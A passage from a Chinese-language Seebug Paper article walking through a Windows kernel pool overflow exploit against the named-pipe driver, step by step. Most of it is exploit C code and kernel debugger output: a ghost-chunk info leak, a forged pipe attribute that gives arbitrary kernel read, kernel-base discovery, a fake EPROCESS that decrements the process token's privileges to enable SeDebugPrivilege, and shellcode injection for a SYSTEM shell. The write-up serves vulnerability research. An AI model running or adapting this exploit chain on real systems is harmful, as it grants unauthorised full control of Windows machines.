从上图我们可以发现，实际上，通过上面的操作，漏洞块和幽灵块共享了同一部分内存，也就是从漏洞块POOL_HEADER处偏移0x40的位置开始，漏洞块和幽灵块共享了0x150大小的内存。

## 4\. 信息泄露

    
    
    if (!xploit->get_leak(xploit, xploit->respray))
            return 0;
    
    
    int get_leak(xploit_t * xploit, pipe_spray_t * respray)
    {
        char leak[0x1000] = {0};
        //#define ATTRIBUTE_NAME      "Z"
        xploit->leak_offset = xploit->targeted_vuln_size + xploit->offset_to_pool_header - xploit->backward_step - xploit->struct_header_size - ATTRIBUTE_NAME_LEN; //leak_offset=0x6
        LOG_DEBUG("Leak offset is 0x%X", xploit->leak_offset);
    
        // leak the data contained in ghost chunk
    
        xploit->leaking_pipe_idx = read_pipes(respray, leak);//int read_pipes(pipe_spray_t * pipe_spray, char * leak)
        if (xploit->leaking_pipe_idx == -1)
        {
            if (xploit->backend == LFH)
                fprintf(stderr, "[-] Reading pipes found no leak :(\n");
            else
                LOG_DEBUG("Reading pipes found no leak");
            return 0;
        }
    
        LOG_DEBUG("Pipe %d of respray leaked data !", xploit->leaking_pipe_idx);
    
        // leak pipe attribute structure !
        xploit->leak_root_attribute = *(uintptr_t *)((char *)leak + xploit->leak_offset + 0x10); // list.next
        xploit->leak_attribute_name = *(uintptr_t *)((char *)leak + xploit->leak_offset + 0x20); // AttributeName
    
        // 0x10 is POOL_HEADER
        xploit->ghost_chunk = xploit->leak_attribute_name - LEN_OF_PIPE_ATTRIBUTE_STRUCT - POOL_HEADER_SIZE;
    
        printf("[+] xploit->leak_root_attribute ptr is 0x%llX\n", xploit->leak_root_attribute);
        printf("[+] xploit->ghost_chunk         ptr is 0x%llX\n", xploit->ghost_chunk);
    
        return 1;
    }

目前我们已经构造出漏洞块和幽灵块共享同一块内存的局面，且我们准确的知道幽灵块与漏洞块的偏移值。所以实际上可以通过NtFsControlFile来获取漏洞块的属性值，那么实际获取到的其实是幽灵块的Pipe_Attribute结构的值。因为在后面的利用中，我们要给幽灵块伪造一个Fake_Pipe_Attribute，同时在利用结束后，需要恢复幽灵块的Pipe_Attribute的原始值，以防蓝屏，所以这里要对原始的Pipe_Attribute值进行保存。

## 5\. 幽灵块设置Fake_Pipe_Attribute

因为幽灵块和漏洞块共享同一块内存，所以要修改幽灵块的Pipe_Attribute，实际只需要修改漏洞块的Pipe_Attribute值即可。

    
    
    xploit->setup_ghost_overwrite(xploit, rewrite_buf);
    xploit->rewrite = prepare_pipes(SPRAY_SIZE * 4, xploit->targeted_vuln_size + POOL_HEADER_SIZE, rewrite_buf, xploit->spray_type);
    close_pipe(&xploit->respray->pipes[xploit->leaking_pipe_idx]);//释放漏洞块
    spray_pipes(xploit->rewrite);//再次占用漏洞块
    
    
    void setup_ghost_overwrite(xploit_t * xploit, char * ghost_overwrite_buf)
    {
        pipe_attribute_t  * overwritten_pipe_attribute;
        strcpy(ghost_overwrite_buf, ATTRIBUTE_NAME);
        overwritten_pipe_attribute = (pipe_attribute_t*)((char *)ghost_overwrite_buf + xploit->ghost_chunk_offset + POOL_HEADER_SIZE);
    
        // 使指向下一个属性的指针在用户层
        overwritten_pipe_attribute->list.Flink = (LIST_ENTRY *)xploit->fake_pipe_attribute;
    
        // 虚拟值，必须在退出前修复它以避免崩溃
        overwritten_pipe_attribute->list.Blink = (LIST_ENTRY *)0xDEADBEEFCAFEB00B;
        // 将属性名设置为一个错误的值，这样当我们试图从这里读取和属性时，就永远找不到它，所以它总是会去下一个指向userland的属性
        overwritten_pipe_attribute->AttributeName = DUMB_ATTRIBUTE_NAME;
        overwritten_pipe_attribute->ValueSize = 0x1;
        overwritten_pipe_attribute->AttributeValue = DUMB_ATTRIBUTE_NAME;
    }

修改后的幽灵块的Pipe_Attribute

    
    
    0: kd> dq ffffb80008cfb3e0 //这里是被rewrite再次占用的幽灵块
    ffffb800`08cfb3e0  7441704e`03190000 ffffffff`ffffffff
    ffffb800`08cfb3f0  ffffb800`0906fbb0 ffffb800`0906fbb0
    ffffb800`08cfb400  ffffb800`08cfb418 00000000`00000156
    ffffb800`08cfb410  ffffb800`08cfb41a 45454545`4545005a
    ffffb800`08cfb420  45454545`45454545 45454545`45454545 //幽灵块的Pipe_Attribute已经被成功修改。
    ffffb800`08cfb430  00000000`00bd1440 deadbeef`cafeb00b //List_next已经被修改为指向用户层的Fake_Pipe_Attribute的指针
    ffffb800`08cfb440  00000000`0040e85c 00000000`00000001
    ffffb800`08cfb450  00000000`0040e85c 45454545`45454545

## 6\. 任意地址读原语

经过上面第五步的操作，实际上我们已经获得了一个任意地址读原语。

在第五步的操作中，我们将幽灵块的Pipe_Attribute进行了修改，Pipe_Attribute的结构如下。

    
    
    //PipeAttribute是未公开的结构体
    struct PipeAttribute {
    LIST_ENTRY list;
    char * AttributeName;
    uint64_t AttributeValueSize ;
    char * AttributeValue ;
    char data [0];
    };

有一个已知的情况是，分页池创建管道后，用户可以向管道添加属性，同时属性值分配的大小和填充的数据完全由用户来控制。

AttributeName和AttributeValue是指向数据区不同偏移的两个指针。

同时在用户层，可以使用0x110038控制码来读取属性值。AttributeValue指针和AttributeValueSize大小将被用于读取属性值并返回给用户。

属性值可以被修改，但这会触发先前的PipeAttribute的释放和新的PipeAttribute的分配。

这意味着如果攻击者可以控制PipeAttribute结构体的AttributeValue和AttributeValueSize字段，它就可以在内核中任意读取数据，但不能任意写。

所以，现在我们控制了幽灵块中Pipe_Attribute的List_next指针值，使其指向用户层的Pipe_Attribute，也就意味着用户层的PipeAttribute结构体的AttributeValue和AttributeValueSize字段我们可以任意指定，也就可以在内核中任意读取数据数据，即获得了一个任意地址读原语。

## 7\. 获取kernel_base

    
    
    void find_kernel_base(xploit_t * xploit)
    {
        uintptr_t file_object_ptr = 0;
        uintptr_t file_object;
        uintptr_t device_object;
        uintptr_t driver_object;
        uintptr_t NpFsdCreate;
    
    
        file_object_ptr = xploit->find_file_object(xploit);
    
        // Get the leak of ntoskrnl and npfs
        exploit_arbitrary_read(xploit, file_object_ptr, (char *)&file_object, 0x8);//文件对象
        printf("[+] File object is : 0x%llx\n", file_object);
    
        exploit_arbitrary_read(xploit, file_object+8, (char *)&device_object, 0x8);//设备对象
        printf("[+] Device object is : 0x%llx\n", device_object);
    
        exploit_arbitrary_read(xploit, device_object+8,(char *)&driver_object, 0x8);//驱动对象
        printf("[+] Driver object is : 0x%llx\n", driver_object);
    
        exploit_arbitrary_read(xploit, driver_object+0x70, (char *)&NpFsdCreate, 0x8);//驱动的第一个派遣函数
        printf("[+] Major function is : 0x%llx\n", NpFsdCreate);
    
        uintptr_t ExAllocatePoolWithTag_ptr = NpFsdCreate - NPFS_NPFSDCREATE_OFFSET + NPFS_GOT_ALLOCATEPOOLWITHTAG_OFFSET;//通过驱动派遣函数先获取到该驱动的基址，然后加上ExAllocatePoolWithTag函数在该驱动的导入表的偏移
        uintptr_t ExAllocatePoolWithTag;
    
        exploit_arbitrary_read(xploit, ExAllocatePoolWithTag_ptr, (char *)&ExAllocatePoolWithTag, 0x8);//从导入表中获取ExAllocatePoolWithTag函数的实际地址
        printf("[+] ExAllocatePoolWithTag is : 0x%llx\n", ExAllocatePoolWithTag);
    
        xploit->kernel_base =  ExAllocatePoolWithTag - NT_ALLOCATEPOOLWITHTAG_OFFSET;//ExAllocatePoolWithTag函数的地址减去nt中的偏移，就拿到了nt的基址
    }
    
    
    0: kd> dt _FILE_OBJECT 0xFFFFE103010A18F0
    ntdll!_FILE_OBJECT
       +0x000 Type             : 0n5
       +0x002 Size             : 0n216
       +0x008 DeviceObject     : 0xffffe102`faf538f0 _DEVICE_OBJECT
       +0x010 Vpb              : (null) 
       +0x018 FsContext        : 0xffffb800`09002980 Void
       +0x020 FsContext2       : 0xffffb800`0885a051 Void
       ..................................................
    0: kd> dt _DEVICE_OBJECT 0xffffe102`faf538f0
    ntdll!_DEVICE_OBJECT
       +0x000 Type             : 0n3
       +0x002 Size             : 0x308
       +0x004 ReferenceCount   : 0n2768
       +0x008 DriverObject     : 0xffffe102`facd8ce0 _DRIVER_OBJECT
       +0x010 NextDevice       : (null) 
       +0x018 AttachedDevice   : 0xffffe102`fc56ace0 _DEVICE_OBJECT
       ............................................................
    0: kd> dt _DRIVER_OBJECT 0xffffe102`facd8ce0
    ntdll!_DRIVER_OBJECT
       +0x000 Type             : 0n4
       +0x002 Size             : 0n336
       +0x008 DeviceObject     : 0xffffe102`faf538f0 _DEVICE_OBJECT
       +0x010 Flags            : 0x12
       +0x018 DriverStart      : 0xfffff803`3f090000 Void
       +0x020 DriverSize       : 0x1c000
       +0x028 DriverSection    : 0xffffe102`faa457c0 Void
       +0x030 DriverExtension  : 0xffffe102`facd8e30 _DRIVER_EXTENSION
       +0x038 DriverName       : _UNICODE_STRING "\FileSystem\Npfs"
       +0x048 HardwareDatabase : 0xfffff803`3a3af8f8 _UNICODE_STRING "\REGISTRY\MACHINE\HARDWARE\DESCRIPTION\SYSTEM"
       +0x050 FastIoDispatch   : 0xffffe102`fa77ae60 _FAST_IO_DISPATCH
       +0x058 DriverInit       : 0xfffff803`3f0a8010     long  Npfs!GsDriverEntry+0
       +0x060 DriverStartIo    : (null) 
       +0x068 DriverUnload     : (null) 
       +0x070 MajorFunction    : [28] 0xfffff803`3f09b670     long  Npfs!NpFsdCreate+0
    0: kd> ? 0xfffff803`3f09b670-0xB670
    Evaluate expression: -8782150565888 = fffff803`3f090000 //这就是Npfs的基址
    0: kd> lmDvmNpfs
    Browse full module list
    start             end                 module name
    fffff803`3f090000 fffff803`3f0ac000   Npfs       (pdb symbols)          d:\symbolsxp\npfs.pdb\D55EC1D15C78BD2E15ACB3E1D6A1A1111\npfs.pdb
        Loaded symbol image file: Npfs.SYS
        Image path: Npfs.SYS
        Image name: Npfs.SYS
        Browse all global symbols  functions  data
        Image was built with /Brepro flag.
        Timestamp:        B03ECFD3 (This is a reproducible build file hash, not a timestamp)
        CheckSum:         000252E2
        ImageSize:        0001C000
        Translations:     0000.04b0 0000.04e4 0409.04b0 0409.04e4
        Information from resource tables:
    
    Unable to enumerate user-mode unloaded modules, Win32 error 0n30
    0: kd> ? fffff803`3f090000 + 0x7050
    Evaluate expression: -8782150537136 = fffff803`3f097050
    0: kd> ln fffff803`3f097050
    Browse module
    Set bu breakpoint
    
    (fffff803`3f097050)   Npfs!_imp_ExAllocatePoolWithTag   |  (fffff803`3f097058)   Npfs!_imp_ExFreePoolWithTag
    Exact matches:
    0: kd> dq fffff803`3f097050 L1
    fffff803`3f097050  fffff803`39d6f010
    0: kd> ln fffff803`39d6f010
    Browse module
    Set bu breakpoint
    
    (fffff803`39d6f010)   nt!ExAllocatePoolWithTag   |  (fffff803`39d6f0a0)   nt!ExFreePool
    Exact matches:
        nt!ExAllocatePoolWithTag (void)
    0: kd> ? fffff803`39d6f010 - 0x36f010
    Evaluate expression: -8782241333248 = fffff803`39a00000 //这就是kernel_base
    0: kd> lmDvmNT
    Browse full module list
    start             end                 module name
    fffff803`39a00000 fffff803`3a4b6000   nt         (pdb symbols)          d:\symbolsxp\ntkrnlmp.pdb\90F5E1C8BBE1FE1FB8A714305EE06F361\ntkrnlmp.pdb
        Loaded symbol image file: ntkrnlmp.exe
        Image path: ntkrnlmp.exe
        Image name: ntkrnlmp.exe
        Browse all global symbols  functions  data
        Image was built with /Brepro flag.
        Timestamp:        4EFCF7A9 (This is a reproducible build file hash, not a timestamp)
        CheckSum:         009785ED
        ImageSize:        00AB6000
        Translations:     0000.04b0 0000.04e4 0409.04b0 0409.04e4
        Information from resource tables:
    
    Unable to enumerate user-mode unloaded modules, Win32 error 0n30

## 8\. SETUP_FAKE_EPROCESS

首先我们看下POOL_HEADER的结构：

    
    
    struct POOL_HEADER
    {
        char PreviousSize;
        char PoolIndex;
        char BlockSize;
        char PoolType;
        int PoolTag;
        Ptr64 ProcessBilled ;
    };

在POOL_HEADER中，如果设置了PoolType中的PoolQuota位，那么将触发POOL
HEADER中ProcessBilled指针的使用，ProcessBilled字段存储经过如下所示的运算后的值。

    
    
    ProcessBilled = EPROCESS_PTR ^ ExpPoolQuotaCookie ^ CHUNK_ADDR

当块被释放时，内核将检查ProcessBilled字段编码的指针是否是一个有效的EPROCESS指针

    
    
    process_ptr = (struct _EPROCESS *)(chunk_addr ^ ExpPoolQuotaCookie ^ chunk_addr ->process_billed );
    if ( process_ptr )
    {
        if (process_ptr < 0xFFFF800000000000 || (process_ptr ->Header.Type & 0x7F) != 3 )
        KeBugCheckEx ([...])
        [...]
    }

如果是有效的指针，释放块后，内核将尝试返还与EPROCESS相关的用于引用的Quota
counter。如果此时EPROCESS是我们提供的FAKE_EPROCESS，它将使用FAKE_EPROCESS结构体来寻找要解引用的指针值。这将提供任意递减原语。递减的值是PoolHeader中的BlockSize。

我们的最终目的是为了提权，那么这里用到的提权方法是设置EPROCESS中TOKEN结构体的Privileges.Enable字段和Privileges.Present字段，默认情况下，低完整性级别的Token的Privileges.Present被设置为0x602880000，Privileges.Enable被设置为0x800000，这时具有的权限只有SeChangeNotifyPrivilege，如果想获取更多权限，例如将Privileges.Enable减1，它将变成
0x7fff，这将启用更多的权限，所以现在我们要做的就是递减TOKEN结构体的Privileges.Enable字段和Privileges.Present字段。

所以现在需要获取ExpPoolQuotaCookie、幽灵块的地址、EXP进程的EPROCESS、EXP进程的TOKEN，以便构造一个正确的FAKE_EPROCESS结构。

    
    
    exploit_arbitrary_read(&xploit, xploit.kernel_base + NT_POOLQUOTACOOKIE_OFFSET, (char *)&xploit.ExpPoolQuotaCookie, 0x8);
    printf("[+] ExpPoolQuotaCookie is : 0x%llx\n", xploit.ExpPoolQuotaCookie);
    if (!find_self_eprocess(&xploit))//获取EXP进程的ERPCESS地址
            goto leave;
    exploit_arbitrary_read(&xploit, xploit.self_eprocess + 0x360, (char *)&xploit.self_token, 0x8);
    xploit.self_token = xploit.self_token & (~0xF);
    setup_fake_eprocess(&xploit);

获取到的值如下

    
    
    0: kd> ? fffff803`39a00000 + 0x5748D0
    Evaluate expression: -8782235612976 = fffff803`39f748d0
    0: kd> ln fffff803`39f748d0
    Browse module
    Set bu breakpoint
    
    (fffff803`39f748d0)   nt!ExpPoolQuotaCookie   |  (fffff803`39f748d8)   nt!PspEnclaveDispatchReturn
    Exact matches:
    0: kd> ? fffff803`39a00000 + 0x5743A0
    Evaluate expression: -8782235614304 = fffff803`39f743a0
    0: kd> ln fffff803`39f743a0 //system进程的EPROCESS
    Browse module
    Set bu breakpoint
    
    (fffff803`39f743a0)   nt!PsInitialSystemProcess   |  (fffff803`39f743a8)   nt!PpmPlatformStates
    Exact matches:
    0: kd> dt nt!_EPROCESS 0xFFFFE102FFBBD0C0
       +0x000 Pcb              : _KPROCESS
       +0x2e0 ProcessLock      : _EX_PUSH_LOCK
       +0x2e8 UniqueProcessId  : 0x00000000`0000073c Void
       +0x2f0 ActiveProcessLinks : _LIST_ENTRY [ 0xffffe102`fa0c5370 - 0xffffe102`ffc09370 ]//通过遍历这个结构，就可以找到EXP进程的EPROCESS
       +0x300 RundownProtect   : _EX_RUNDOWN_REF
       +0x308 Flags2           : 0x200d000
     ........................................
       +0x360 Token            : _EX_FAST_REF 
     ........................................
       +0x410 QuotaBlock       : 0xffffe102`fd322d40 _EPROCESS_QUOTA_BLOCK //这就是将要被递减的Quota counter 偏移为0x410
     ........................................
       +0x450 ImageFileName    : [15]  "poc_exploit-re"
    0: kd> ? 0xFFFFE102FFBBD0C0+0x360
    Evaluate expression: -34071980026848 = ffffe102`ffbbd420
    0: kd> dq ffffe102`ffbbd420 L1
    ffffe102`ffbbd420  ffffb800`08ddb064
    0: kd> ? ffffb800`08ddb064 & 0xFFFFFFFFFFFFFFF0
    Evaluate expression: -79164688453536 = ffffb800`08ddb060 //这里才是真实的TOKEN值
    0: kd> dt nt!_TOKEN ffffb800`08ddb060
       +0x000 TokenSource      : _TOKEN_SOURCE
       +0x010 TokenId          : _LUID
       +0x018 AuthenticationId : _LUID
       +0x020 ParentTokenId    : _LUID
       +0x028 ExpirationTime   : _LARGE_INTEGER 0x7fffffff`ffffffff
       +0x030 TokenLock        : 0xffffe102`fe18dc90 _ERESOURCE
       +0x038 ModifiedId       : _LUID
       +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
       +0x058 AuditPolicy      : _SEP_AUDIT_POLICY
       +0x078 SessionId        : 1
       ............................................
    0: kd> dx -id 0,0,ffffe102fa07b300 -r1 (*((ntkrnlmp!_SEP_TOKEN_PRIVILEGES *)0xffffb80008ddb0a0))
    (*((ntkrnlmp!_SEP_TOKEN_PRIVILEGES *)0xffffb80008ddb0a0))                 [Type: _SEP_TOKEN_PRIVILEGES]
        [+0x000] Present          : 0x602880000 [Type: unsigned __int64] //默认值为0x602880000
        [+0x008] Enabled          : 0x800000 [Type: unsigned __int64] //默认值为0x800000
        [+0x010] EnabledByDefault : 0x40800000 [Type: unsigned __int64]
    0: kd> !TOKEN ffffb800`08ddb060
    _TOKEN 0xffffb80008ddb060
        19 0x000000013 SeShutdownPrivilege               Attributes - 
        23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default //默认只有SeChangeNotifyPrivilege权限
        25 0x000000019 SeUndockPrivilege                 Attributes - 
        33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes - 
        34 0x000000022 SeTimeZonePrivilege               Attributes - 

此时构造FAKE_EPROCESS所需的值已经全都拿到了

    
    
    void setup_fake_eprocess(xploit_t * xploit)
    {
        char fake_eprocess_attribute_buf[0x1000] = {0};
        char fake_eprocess_buf[0x10000] = {0};
    
    
    
        strcpy(fake_eprocess_attribute_buf, DUMB_ATTRIBUTE_NAME2);
    
    
        initFakeEprocess(fake_eprocess_buf, (PVOID)xploit->self_token + 0x48);//填入self_token + 0x48
        //#define DUMB_ATTRIBUTE_NAME2 "DUMB2"  
        //#define DUMB_ATTRIBUTE_NAME2_LEN  sizeof(DUMB_ATTRIBUTE_NAME2)
        memcpy(fake_eprocess_attribute_buf + DUMB_ATTRIBUTE_NAME2_LEN, fake_eprocess_buf, FAKE_EPROCESS_SIZE);
        initFakeEprocess(fake_eprocess_buf, (PVOID)xploit->self_token + 0x41);//self_token + 0x41
        memcpy(fake_eprocess_attribute_buf + DUMB_ATTRIBUTE_NAME2_LEN + FAKE_EPROCESS_SIZE, fake_eprocess_buf, FAKE_EPROCESS_SIZE);
    
        xploit->alloc_fake_eprocess(xploit, fake_eprocess_attribute_buf);
    
        printf("[+] fake_eprocess is : 0x%llx\n", xploit->fake_eprocess);
    }

self_token + 0x48和self_token + 0x41的值如下

    
    
    0: kd> ? ffffb800`08ddb060 + 0x41
    Evaluate expression: -79164688453471 = ffffb800`08ddb0a1
    0: kd> dq ffffb800`08ddb0a1 L1
    ffffb800`08ddb0a1  00000000`06028800 //Privileges.Present
    0: kd> ? ffffb800`08ddb060 + 0x48
    Evaluate expression: -79164688453464 = ffffb800`08ddb0a8
    0: kd> dq ffffb800`08ddb0a8 L1
    ffffb800`08ddb0a8  00000000`00800000 //Privileges.Enable

将Fake_EPROCESS填充到POOL_HEADER的ProcessBilled字段

    
    
    xploit.setup_final_write(&xploit, final_write_buf);//这里将Pipe_Attribute属性中特定偏移处的值设置为幽灵块原始的Pipe_Attribute的值，以防蓝屏
    free_pipes(xploit.respray);
    xploit.respray = NULL;
    free_pipes(xploit.rewrite);//释放漏洞块
    xploit.rewrite = NULL;
    xploit.final_write = prepare_pipes(SPRAY_SIZE * 10, xploit.targeted_vuln_size + POOL_HEADER_SIZE, final_write_buf, xploit.spray_type);
    if (!spray_pipes(xploit.final_write))//重新占用漏洞块，且修复了Pipe_Attribute为原始值，并且将ProcessBilled指针设置为Fake_Eprocess异或后的值
            goto leave_wait;

填充完Fake_EPROCESS后，幽灵块的Pipe_Attribute如下

    
    
    0: kd> dq ffffb80008cfb3e0
    ffffb800`08cfb3e0  7441704e`03190000 ffffffff`ffffffff
    ffffb800`08cfb3f0  ffffb800`09126710 ffffb800`09126710
    ffffb800`08cfb400  ffffb800`08cfb418 00000000`00000156
    ffffb800`08cfb410  ffffb800`08cfb41a 46464646`4646005a
    ffffb800`08cfb420  41424344`08210000 d60eba94`936c5d5f
    ffffb800`08cfb430  ffffb800`0885a190 ffffb800`0885a190 //list_nest已经还原
    ffffb800`08cfb440  00000000`0040e85a 46464646`46464646
    ffffb800`08cfb450  46464646`46464646 46464646`46464646
    0: kd> dt nt!_POOL_HEADER ffffb800`08cfb420
       +0x000 PreviousSize     : 0y00000000 (0)
       +0x000 PoolIndex        : 0y00000000 (0)
       +0x002 BlockSize        : 0y00100001 (0x21)
       +0x002 PoolType         : 0y00001000 (0x8)
       +0x000 Ulong1           : 0x8210000
       +0x004 PoolTag          : 0x41424344
       +0x008 ProcessBilled    : 0xd60eba94`936c5d5f _EPROCESS //这里是经过异或的FAKE_EPROCESS
       +0x008 AllocatorBackTraceIndex : 0x5d5f
       +0x00a PoolTagHash      : 0x936c
    0: kd> dq fffff803`39f748d0 L1
    fffff803`39f748d0  d60ee396`61a519ef
    0: kd> ? 0xd60eba94`936c5d5f ^ d60ee396`61a519ef ^ ffffb800`08cfb420
    Evaluate expression: -34072075767664 = ffffe102`fa06f090 //
    0: kd> dt nt!_EPROCESS ffffe102`fa06f090
       +0x000 Pcb              : _KPROCESS
       +0x2e0 ProcessLock      : _EX_PUSH_LOCK
       +0x2e8 UniqueProcessId  : 0x41414141`41414141 Void
       +0x2f0 ActiveProcessLinks : _LIST_ENTRY [ 0x41414141`41414141 - 0x41414141`41414141 ]
       +0x300 RundownProtect   : _EX_RUNDOWN_REF
       .........................................
       +0x410 QuotaBlock       : 0xffffb800`08ddb0a8 _EPROCESS_QUOTA_BLOCK
       +0x418 ObjectTable      : 0x41414141`41414141 _HANDLE_TABLE
       .........................................
    0: kd> dq 0xffffb80008ddb0a8 L1
    ffffb800`08ddb0a8  00000000`00800000 //FAKE_EPROCESS的QuotaBlock已经被填充为TOKEN的Privileges.Enable，这个值将会在幽灵块释放后被递减

## 9\. 第一次释放幽灵块

当释放幽灵块时，FAKE_EPROCESS相关的Quota counter将会被递减，也就是会对Privileges.Enable进行递减。

    
    
    xploit.free_ghost_chunk(&xploit);//第一次释放幽灵块
    xploit.alloc_ghost_chunk(&xploit, attribute);//再次占用幽灵块
    free_pipes(xploit.final_write);
    xploit.final_write = NULL;
    spray_pipes(xploit.final_write2);//第一次释放幽灵块后，这里再次占用漏洞块，然后将新的幽灵块的ProcessBilled继续填充为FAKE_EPROCESS

第一次释放幽灵块

    
    
    0: kd> dq ffffb80008cfb3e0
    ffffb800`08cfb3e0  7441704e`03190000 ffffffff`ffffffff
    ffffb800`08cfb3f0  ffffb800`0956c870 ffffb800`0956c870
    ffffb800`08cfb400  ffffb800`08cfb418 00000000`00000156
    ffffb800`08cfb410  ffffb800`08cfb41a 46464646`4646005a
    ffffb800`08cfb420  41424344`08e40000 d60eba94`936c581f
    ffffb800`08cfb430  ffffb800`0885a190 ffffb800`0885a190
    ffffb800`08cfb440  00000000`0040e85a 46464646`46464646
    ffffb800`08cfb450  46464646`46464646 46464646`46464646
    0: kd> dx -id 0,0,ffffe102fa07b300 -r1 (*((ntkrnlmp!_SEP_TOKEN_PRIVILEGES *)0xffffb80008ddb0a0))
    (*((ntkrnlmp!_SEP_TOKEN_PRIVILEGES *)0xffffb80008ddb0a0))                 [Type: _SEP_TOKEN_PRIVILEGES]
        [+0x000] Present          : 0x602880000 [Type: unsigned __int64]
        [+0x008] Enabled          : 0x7ffdf0 [Type: unsigned __int64] //可以看到，Privileges.Enable的值已经改变
        [+0x010] EnabledByDefault : 0x40800000 [Type: unsigned __int64]
    0: kd> dt nt!_POOL_HEADER ffffb800`08cfb420
       +0x000 PreviousSize     : 0y00000000 (0)
       +0x000 PoolIndex        : 0y00000000 (0)
       +0x002 BlockSize        : 0y11100100 (0xe4)
       +0x002 PoolType         : 0y00001000 (0x8)
       +0x000 Ulong1           : 0x8e40000
       +0x004 PoolTag          : 0x41424344
       +0x008 ProcessBilled    : 0xd60eba94`936c581f _EPROCESS //这是第二次准备递减的异或后的FAKE_EPROCESS
       +0x008 AllocatorBackTraceIndex : 0x581f
       +0x00a PoolTagHash      : 0x936c

## 10\. 第二次释放幽灵块

    
    
    xploit.free_ghost_chunk(&xploit);

第二次释放幽灵块后，Privileges.Present也已经修改成功。

    
    
    0: kd> dx -id 0,0,ffffe102fa07b300 -r1 (*((ntkrnlmp!_SEP_TOKEN_PRIVILEGES *)0xffffb80008ddb0a0))
    (*((ntkrnlmp!_SEP_TOKEN_PRIVILEGES *)0xffffb80008ddb0a0))                 [Type: _SEP_TOKEN_PRIVILEGES]
        [+0x000] Present          : 0x60279c000 [Type: unsigned __int64]
        [+0x008] Enabled          : 0x7ffdf0 [Type: unsigned __int64]
        [+0x010] EnabledByDefault : 0x40800000 [Type: unsigned __int64]

#### 11\. shellcode注入

到此为止，我们已经成功获取到了SeDebugPrivilege权限

    
    
    0: kd> dt _token ffff8b81`b54f8830
        .................................
        14 0x00000000e SeIncreaseBasePriorityPrivilege   Attributes - Enabled 
        15 0x00000000f SeCreatePagefilePrivilege         Attributes - Enabled 
        16 0x000000010 SeCreatePermanentPrivilege        Attributes - Enabled 
        19 0x000000013 SeShutdownPrivilege               Attributes - Enabled 
        20 0x000000014 SeDebugPrivilege                  Attributes - Enabled 
        21 0x000000015 SeAuditPrivilege                  Attributes - Enabled 
        22 0x000000016 SeSystemEnvironmentPrivilege      Attributes - Enabled 
        25 0x000000019 SeUndockPrivilege                 Attributes - 
        33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes - 
        34 0x000000022 SeTimeZonePrivilege               Attributes - 
        ..................................

此时我们就可以打开任意SYSTEM权限进程，并注入shellcode实现弹出一个SYSTEM权限的shell。

![image-20211017203426088](https://images.seebug.org/content/images/2021/10/19/1634632889000-22redht.png-w331s)

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1743/>

